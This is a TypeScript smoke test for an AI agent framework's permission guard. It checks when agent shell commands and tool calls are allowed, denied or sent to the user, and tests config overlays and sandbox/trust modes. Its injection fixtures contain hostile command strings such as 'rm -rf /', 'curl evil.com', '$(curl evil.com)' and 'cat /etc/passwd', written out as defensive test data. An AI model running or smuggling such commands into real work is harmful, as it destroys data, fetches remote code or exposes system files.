#!/usr/bin/env bun
/**
 * Smoke test for permission-guard runtime behavior, split out of
 * test-permission-guard.ts (#171, AGENTS.md §12 file-size limit): bash
 * injection-vector quoting, ask-by-default wildcard precedence, project-
 * config-overlay walk-up + subagent overlay honoring, buildCwdHint, and the
 * sandbox/trust-mode short-circuits. No Pi children spawned.
 */

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { findProjectConfigPath, resolveToolPermission } from "../src/permission-guard.js";
import { buildCwdHint } from "../src/spawn.js";

let exitCode = 0;
function assert(cond: boolean, msg: string) {
  if (cond) {
    console.log(`✓ ${msg}`);
  } else {
    console.error(`✗ ${msg}`);
    exitCode = 1;
  }
}

let agentsConfig: Record<
  string,
  {
    permission?: Record<string, string | Record<string, string>>;
  }
>;
try {
  const __filename = new URL(import.meta.url).pathname;
  const __dirname = path.dirname(__filename);
  const agentsPath = path.resolve(__dirname, "..", "..", "agents.json");
  const agentsRaw = readFileSync(agentsPath, "utf8");
  const agentsParsed = JSON.parse(agentsRaw);
  agentsConfig = agentsParsed.agent ?? {};
} catch (err) {
  assert(false, `Failed to load agents.json: ${err}`);
  process.exit(1);
}

console.log("=== test-permission-guard-runtime summary ===\n");

// === Issue #108 tests: injection-vector check is now quote-aware ===
// Operators (&&, |, ;, etc.) INSIDE quoted args don't trip the deny —
// bash doesn't interpret them as separators there. Operators OUTSIDE
// quotes still deny.

const quotedInjectionShouldAllow = [
  `vipune add 'cargo fmt --check && cargo clippy -- -D warnings && cargo test'`,
  `vipune add "memory containing && pipe | and semicolon;"`,
  `vipune add 'gotchas: < input > output | filter'`,
  `vipune search "open && blocking PRs"`,
  `vipune add "escaped \\"quotes\\" and && inside"`,
];
for (const command of quotedInjectionShouldAllow) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "allow",
    `Issue #108: operators inside quoted args allowed — \`${command.slice(0, 70)}...\``,
  );
}

// Mixed: real operator OUTSIDE the quoted segment falls through to ask —
// the user reads the full command text and decides. Cache wildcard
// expansion still refuses to honor these (see bashPatternMatches).
const mixedInjectionShouldAsk = [
  `vipune add "safe content"; rm -rf /`,
  `vipune add 'safe' && curl evil.com`,
  `vipune add 'foo' | tee /tmp/out`,
];
for (const command of mixedInjectionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: operator OUTSIDE quoted segment prompts the user — \`${command}\``,
  );
}

// Malformed (unterminated quote) — safe-default: stripQuotedSegments returns
// the original full string, and any embedded operators fall through to ask
// rather than silently allowing.
const malformedQuoteShouldAsk = [
  `vipune add "lorem && ipsum`, // unterminated double quote with operator
  `vipune add 'unclosed | with pipe`, // unterminated single quote with operator
];
for (const command of malformedQuoteShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: malformed quote with embedded operator prompts the user — \`${command}\``,
  );
}

// Command substitution `$(...)` is NOT stripped — it's a real injection
// vector regardless of being "inside" quotes (bash interprets $(...) inside
// double quotes). Resolves to ask: parent prompt shows the literal command
// text including the $(...), user decides. Cache wildcard expansion still
// refuses to wildcard these.
const commandSubstitutionShouldAsk = [
  `vipune add "$(curl evil.com)"`,
  `vipune add "result: $(rm -rf /)"`,
];
for (const command of commandSubstitutionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: command substitution prompts the user even inside quotes — \`${command}\``,
  );
}

// === Issue #112 tests: PM bare `git diff` for adversarial_loop input ===
// Bare `git diff` is allowed because adversarial_loop takes the raw diff text
// as a parameter — PM runs the diff, captures stdout, passes to the dispatch.
// `oo git diff *` stays available for compression-tier reads PM does itself.

const gitDiffShouldAllow = [
  "git diff",
  "git diff --stat",
  "git diff --shortstat",
  "git diff --name-only",
  "git diff --name-status",
  "git diff HEAD",
  "git diff main..feature",
  "git diff HEAD~1 src/foo.ts",
];
for (const command of gitDiffShouldAllow) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "allow",
    `Issue #112: bare \`${command}\` is allowed for project-manager (for adversarial_loop input)`,
  );
}

// Redirects, chains, etc. on git diff fall through to ask — the bare
// `git diff` allow does NOT auto-extend to chained variants, since the chain
// shape itself needs the user's eyes on it.
const gitDiffWithInjectionShouldAsk = [
  "git diff > /tmp/foo",
  "git diff && cat /etc/passwd",
  "git diff | grep secret",
];
for (const command of gitDiffWithInjectionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #112+#188: \`${command}\` prompts the user (bare git diff allow does not extend to chains/redirects)`,
  );
}

// === Issue #168: ask-by-default for unknown tools ===
// PM's catch-all is `"*": "ask"` — unknown tools (including the dynamically-
// named `mcp__<server>__<tool>` tools of the native MCP, issue #959) prompt
// rather than silently failing. The per-tool grants below are explicit and
// beat the catch-all; an ungranted server's tools fall through to ask. "Allow
// always" persists per-project ($PWD/.pi/decisions.json).
//
// Pre-#959 this section covered the pi-mcp-adapter era: the catch-all used to
// be `"*": "deny"` (silent-deny of unknown tools, including the `mcp` gateway
// and per-server direct tools like `fuzu_staging_db_execute_sql` that the
// adapter surfaced with arbitrary names). The fix flipped it to `"*": "ask"`
// so any unknown tool prompts. The MCP-gateway allow/ask split (PM `mcp: allow`,
// specialists `mcp: ask`) is gone — native MCP registers per-tool names instead.

// Native-MCP tool naming (the post-#959 convention: the adapter's
// `codebase_memory_<tool>` direct-tool names are gone; the native MCP
// registers `mcp__<server>__<tool>` instead).
const mcpSearchPM = resolveToolPermission("mcp__codebase_memory__search_code", "project-manager", {}, {}, agentsConfig);
assert(mcpSearchPM === "allow", "PM has explicit mcp__codebase_memory__search_code: allow");

const mcpIndexPM = resolveToolPermission("mcp__codebase_memory__index_repository", "project-manager", {}, {}, agentsConfig);
assert(mcpIndexPM === "allow", "PM has explicit mcp__codebase_memory__index_repository: allow (first-run admin call)");

// Per-role subset: ops gets only 3 of the 7 read-side tools (search_code,
// get_code_snippet, get_architecture) — the ticket's AC asserts the
// per-role subsets are preserved. An ungranted tool resolves to ask (the
// catch-all), not deny — the prompt is the boundary.
const mcpQueryOps = resolveToolPermission("mcp__codebase_memory__query_graph", "ops", {}, {}, agentsConfig);
assert(
  mcpQueryOps === "ask",
  "#959: ops is NOT granted mcp__codebase_memory__query_graph (per-role subset: search_code, get_code_snippet, get_architecture only) — falls through to ask",
);
const mcpSearchOps = resolveToolPermission("mcp__codebase_memory__search_code", "ops", {}, {}, agentsConfig);
assert(mcpSearchOps === "allow", "#959: ops IS granted mcp__codebase_memory__search_code");

// Any unknown mcp__ tool from a server the operator has not reviewed asks —
// the prompt is the security boundary, not silent deny.
const unknownMcp = resolveToolPermission("mcp__fuzu_staging_db__execute_sql", "project-manager", {}, {}, agentsConfig);
assert(unknownMcp === "ask", "#959: unknown mcp__<server>__<tool> resolves to ask for PM (catch-all = ask)");

// Any unknown tool — the prompt is the security boundary now, not silent deny.
const unknownTool = resolveToolPermission("some_random_tool", "project-manager", {}, {}, agentsConfig);
assert(unknownTool === "ask", "Issue #168: any unknown tool resolves to ask for PM (catch-all = ask)");

// Explicit allows still take precedence over the catch-all.
const explicitAllow = resolveToolPermission("read", "project-manager", {}, {}, agentsConfig);
assert(explicitAllow === "allow", "Issue #168: explicit `read: allow` still beats `*: ask`");

// Explicit denies are still honored.
const explicitDeny = resolveToolPermission("write", "project-manager", {}, {}, agentsConfig);
assert(explicitDeny === "deny", "Issue #168: explicit `write: deny` still beats `*: ask`");

// Wildcard precedence (the lookupPermission ordering fix from this PR):
// longest prefix wins, then `"*"` catch-all. Without the fix, `"*"` matched
// first on iteration order regardless of specificity.
const synthetic = {
  "project-manager": {
    permission: {
      "*": "ask",
      "dangerous_*": "deny",
      "dangerous_but_safe_*": "allow",
    },
  },
};
const longer = resolveToolPermission(
  "dangerous_but_safe_read",
  "project-manager",
  {},
  {},
  synthetic,
);
assert(
  longer === "allow",
  "Issue #168: longer prefix `dangerous_but_safe_*` beats shorter `dangerous_*`",
);
const shorter = resolveToolPermission("dangerous_op", "project-manager", {}, {}, synthetic);
assert(
  shorter === "deny",
  "Issue #168: shorter prefix `dangerous_*` fires when longer does not match",
);
const fallthrough = resolveToolPermission(
  "totally_unrelated",
  "project-manager",
  {},
  {},
  synthetic,
);
assert(fallthrough === "ask", "Issue #168: catch-all `*: ask` fires when no wildcard matches");

// === L7 (PR #192): findProjectConfigPath walks up from cwd ===
// User behaviour: place `.pi/permissions.json` at the repo root and expect it
// to apply when pi runs in any subdirectory (or any worktree subagent spawned
// with `cwd=<worktree>`). Mirrors git's `.git` ancestor search.
{
  const tmpRoot = mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-walkup-"));
  try {
    const repoRoot = path.join(tmpRoot, "fake-repo");
    const piDir = path.join(repoRoot, ".pi");
    const overlayPath = path.join(piDir, "permissions.json");
    const nestedDir = path.join(repoRoot, "src", "sub", "deeper");
    mkdirSync(nestedDir, { recursive: true });
    mkdirSync(piDir, { recursive: true });
    writeFileSync(
      overlayPath,
      JSON.stringify({ roles: { developer: { permission: { "mcp*": "allow" } } } }),
    );

    // Walks up from a nested dir
    const walkedUp = findProjectConfigPath(nestedDir);
    assert(
      walkedUp === overlayPath,
      `L7: findProjectConfigPath walks up from nested dir to repo root (got: ${walkedUp})`,
    );

    // Returns null when no overlay anywhere in ancestry
    const noOverlayTmp = mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-no-overlay-"));
    try {
      const noOverlayResult = findProjectConfigPath(noOverlayTmp);
      assert(
        noOverlayResult === null,
        `L7: findProjectConfigPath returns null when no .pi/permissions.json in ancestry (got: ${noOverlayResult})`,
      );
    } finally {
      rmSync(noOverlayTmp, { recursive: true, force: true });
    }
  } finally {
    rmSync(tmpRoot, { recursive: true, force: true });
  }
}

// === L7 (PR #192): subagent guard now honors project + global overlays ===
// Pre-#192 the subagent guard stubbed projectConfig + globalConfig to `{}`,
// so a user's `.pi/permissions.json` like
//   { "roles": { "developer": { "permission": { "mcp*": "allow" } } } }
// was silently ignored. The subagent flow now resolves overlays the same
// way the parent does. We exercise the resolution function with a
// synthesized overlay because the runtime overlay load is a side-effect
// (file I/O) — what matters is that the verdict resolver applies it.
{
  const subagentAgentsConfig: Record<
    string,
    { permission?: Record<string, string | Record<string, string>> }
  > = {
    developer: {
      permission: {
        // baseline denies a wildcard the user wants to grant
        "mcp*": "deny",
      },
    },
  };
  const subagentProjectOverlay: typeof subagentAgentsConfig = {
    developer: {
      permission: {
        // user grants it in the project overlay
        "mcp*": "allow",
      },
    },
  };
  const subagentResolved = resolveToolPermission(
    "mcp__playwright__browser_navigate",
    "developer",
    subagentProjectOverlay,
    {},
    subagentAgentsConfig,
  );
  assert(
    subagentResolved === "allow",
    "L7: project overlay (developer mcp*: allow) overrides the baseline explicit deny — applies in subagents too post-#192 (the catch-all is ask, not deny, post-#959)",
  );

  // Global overlay also takes effect
  const subagentGlobalOverlay: typeof subagentAgentsConfig = {
    developer: {
      permission: {
        "mcp*": "allow",
      },
    },
  };
  const subagentGlobalResolved = resolveToolPermission(
    "mcp__playwright__browser_navigate",
    "developer",
    {},
    subagentGlobalOverlay,
    subagentAgentsConfig,
  );
  assert(
    subagentGlobalResolved === "allow",
    "L7: global overlay also overrides the baseline explicit deny in subagents (catch-all is ask, not deny, post-#959)",
  );
}

// === L4 (PR #192): buildCwdHint emits a concrete runtime context line ===
// When PM dispatches with `cwd: <path>`, spawn.ts prepends a runtime hint
// containing the absolute path. Weak models can't ignore a concrete path
// the way they can ignore generic "do not cd" doctrine.
{
  const noCwd = buildCwdHint(undefined);
  assert(noCwd === "", "L4: buildCwdHint returns empty string when cwd is undefined");

  const withCwd = buildCwdHint("/Users/janni/projects/nessie/.worktrees/issue-482");
  assert(
    withCwd.includes("/Users/janni/projects/nessie/.worktrees/issue-482"),
    "L4: buildCwdHint embeds the literal cwd path",
  );
  assert(
    withCwd.startsWith("[runtime context:"),
    "L4: buildCwdHint is recognizable as a runtime-context line",
  );
  assert(withCwd.includes("Do NOT 'cd'"), "L4: buildCwdHint carries the no-cd instruction");
  assert(
    withCwd.includes("git -C") &&
      withCwd.includes("--manifest-path") &&
      withCwd.includes("--prefix"),
    "L4: buildCwdHint lists the cd-replacement tool flags",
  );
  assert(
    withCwd.endsWith("\n\n"),
    "L4: buildCwdHint terminates with blank line so prompt body starts cleanly",
  );
}

// === L8 (PR #197): sandbox-mode short-circuits permission gating ===
// When PI_ENSEMBLE_SANDBOX_MODE=1, registerPermissionGuard and
// registerSubagentGuard return immediately without installing any tool_call
// handler. The container fence becomes the trust boundary. Tested by
// observing the registration is a no-op: pi-ensemble's `tool_call`
// listener list doesn't grow when we re-register with sandbox mode on.
{
  // Minimal fake ExtensionAPI that captures handler registrations.
  const handlers: Array<{ event: string; fn: unknown }> = [];
  const fakeApi = {
    on: (event: string, fn: unknown) => {
      handlers.push({ event, fn });
    },
  } as unknown as Parameters<
    typeof import("../src/permission-guard.js").registerPermissionGuard
  >[0];

  // Save + clear the env, run with sandbox mode on, verify zero handlers
  // got registered. Restore env afterwards.
  const prev = process.env.PI_ENSEMBLE_SANDBOX_MODE;
  process.env.PI_ENSEMBLE_SANDBOX_MODE = "1";
  try {
    const { registerPermissionGuard } = await import("../src/permission-guard.js");
    handlers.length = 0;
    registerPermissionGuard(fakeApi);
    const toolCallHandlers = handlers.filter((h) => h.event === "tool_call");
    // In sandbox mode the legacy permission handler is not registered, but the
    // mode-independent guards ARE (registered ahead of the sandbox short-circuit,
    // #598 issue-creation + #600 PM bash allowlist + #912 merge guard).
    assert(
      toolCallHandlers.length === 3,
      `L8: PI_ENSEMBLE_SANDBOX_MODE=1 short-circuits the legacy permission handler — only the mode-independent guards remain (${toolCallHandlers.length} tool_call handler(s))`,
    );

    // session_start is also a guard concern (decisions cache load).
    // Sandbox mode short-circuits before that's registered.
    const sessionStartHandlers = handlers.filter((h) => h.event === "session_start");
    assert(
      sessionStartHandlers.length === 0,
      "L8: PI_ENSEMBLE_SANDBOX_MODE=1 also skips session_start handler (no decisions cache load)",
    );
  } finally {
    if (prev === undefined) process.env.PI_ENSEMBLE_SANDBOX_MODE = undefined;
    else process.env.PI_ENSEMBLE_SANDBOX_MODE = prev;
  }
}

// === L9: trust-mode bypasses per-call gating in interactive host mode ===
// pi-ensemble enforces NO per-call permissions when there's no boundary worth
// enforcing. Three short-circuit conditions: sandbox env, interactive host
// (hasUI=true, no strict opt-in), explicit TRUST_MODE env. Headless mode
// (!hasUI) preserves the legacy hard-deny safety boundary. See isInTrustMode
// in permission-guard.ts for the rationale.
{
  const savedSandbox = process.env.PI_ENSEMBLE_SANDBOX_MODE;
  const savedStrict = process.env.PI_ENSEMBLE_STRICT_PERMISSIONS;
  const savedTrust = process.env.PI_ENSEMBLE_TRUST_MODE;
  // Clear all three before each case to start from a clean slate.
  const reset = () => {
    process.env.PI_ENSEMBLE_SANDBOX_MODE = undefined;
    process.env.PI_ENSEMBLE_STRICT_PERMISSIONS = undefined;
    process.env.PI_ENSEMBLE_TRUST_MODE = undefined;
  };
  try {
    const { isInTrustMode } = await import("../src/permission-guard.js");

    reset();
    assert(
      isInTrustMode(true) === true,
      "L9: interactive host (hasUI=true, no env) → trust mode ON",
    );
    assert(
      isInTrustMode(false) === false,
      "L9: headless (hasUI=false, no env) → trust mode OFF (legacy hard-deny path preserved)",
    );

    reset();
    process.env.PI_ENSEMBLE_SANDBOX_MODE = "1";
    assert(
      isInTrustMode(true) === true && isInTrustMode(false) === true,
      "L9: sandbox env → trust mode ON regardless of hasUI",
    );

    reset();
    process.env.PI_ENSEMBLE_TRUST_MODE = "1";
    assert(
      isInTrustMode(false) === true,
      "L9: explicit TRUST_MODE env (set by spawn.ts on subagents) → trust mode ON even without UI",
    );

    reset();
    process.env.PI_ENSEMBLE_STRICT_PERMISSIONS = "1";
    assert(
      isInTrustMode(true) === false,
      "L9: STRICT_PERMISSIONS opt-in restores legacy ask flow even when interactive",
    );

    reset();
    process.env.PI_ENSEMBLE_STRICT_PERMISSIONS = "1";
    process.env.PI_ENSEMBLE_SANDBOX_MODE = "1";
    assert(
      isInTrustMode(true) === true,
      "L9: sandbox env wins over STRICT_PERMISSIONS (sandbox is structurally trusted regardless)",
    );
  } finally {
    if (savedSandbox === undefined) process.env.PI_ENSEMBLE_SANDBOX_MODE = undefined;
    else process.env.PI_ENSEMBLE_SANDBOX_MODE = savedSandbox;
    if (savedStrict === undefined) process.env.PI_ENSEMBLE_STRICT_PERMISSIONS = undefined;
    else process.env.PI_ENSEMBLE_STRICT_PERMISSIONS = savedStrict;
    if (savedTrust === undefined) process.env.PI_ENSEMBLE_TRUST_MODE = undefined;
    else process.env.PI_ENSEMBLE_TRUST_MODE = savedTrust;
  }
}

console.log("\n=== test-permission-guard-runtime summary ===");
console.log(`exit ${exitCode}`);
process.exit(exitCode);
